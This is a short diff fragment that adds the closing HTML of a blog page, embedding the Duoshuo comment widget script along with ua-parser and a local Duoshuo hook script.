+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
